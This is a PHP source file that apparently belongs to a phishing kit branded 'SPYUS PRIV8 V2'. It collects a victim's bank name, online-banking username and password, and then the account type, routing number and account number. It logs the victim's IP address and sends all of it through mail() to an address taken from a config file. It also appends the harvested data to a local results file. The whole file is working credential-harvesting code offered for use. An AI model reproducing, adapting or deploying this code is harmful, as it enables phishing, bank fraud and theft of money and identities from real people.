<?php
include 'config.php';
        $ip = getenv("REMOTE_ADDR");
   if (isset($_POST['eBank'])) {
        $_SESSION['eUsername'] = $eUsername = $_POST['eUsername'];
        $_SESSION['ePassword'] = $ePassword = $_POST['ePassword'];
        $_SESSION['eBank'] = $eBank = $_POST['eBank'];
		
    } elseif (isset($_POST['savings_or_checking'])) {
        $savings_or_checking = $_POST['savings_or_checking'];
        $uRouting = $_POST['uRouting'];
        $uAccount = $_POST['uAccount'];
		$eUsername = $_SESSION['eUsername'];
        $ePassword = $_SESSION['ePassword'];
        $eBank = $_SESSION['eBank'];
		
    }
	   	   if (isset($_POST['eBank'])) {
        $message.= "=======================================================\n";
        $message.= "Bank Name  :  ".$eBank."\n";
        $message.= "Username  :  ".$eUsername."\n";
        $message.= "Password  :  ".$ePassword."\n";
		$message.= "=======================================================\n";
}
	   if (isset($_POST['savings_or_checking'])) {
        $message.= "=======================================================\n";
        $message.= "Bank Name  :  ".$eBank."\n";
        $message.= "Username  :  ".$eUsername."\n";
        $message.= "Password  :  ".$ePassword."\n";
        $message.= "Account Type  :  ".$savings_or_checking."\n";
	    $message.= "Routing Number  :  ".$uRouting."\n";
	    $message.= "Account Number  :  ".$uAccount."\n";
        $message.= "=======================================================\n";
}
        $message.= "Client IP  :  ".$ip."           \n";
        $message.= "IP Link  :  http://ip-api.com/#".$ip."\n";
        $message.= "=======================================================\n";
        $subject = "SPYUS PRIV8 V2 BANK INFO [$eBank] - $ip";
        $subject = "SPYUS Re3sult V2 Bank | $ip | $eBank";
        $headers = "From: L33KTBB <CAZANOVA163-Tools@hotmail.com>\r\n";
        mail($email,$subject,$message,$headers);
		buka($_SESSION['Language'], $message);
        $file = fopen("../../result/Re3sult.txt","ab");
        fwrite($file,$message);
        fclose($file);
		echo 'to_identity';

?>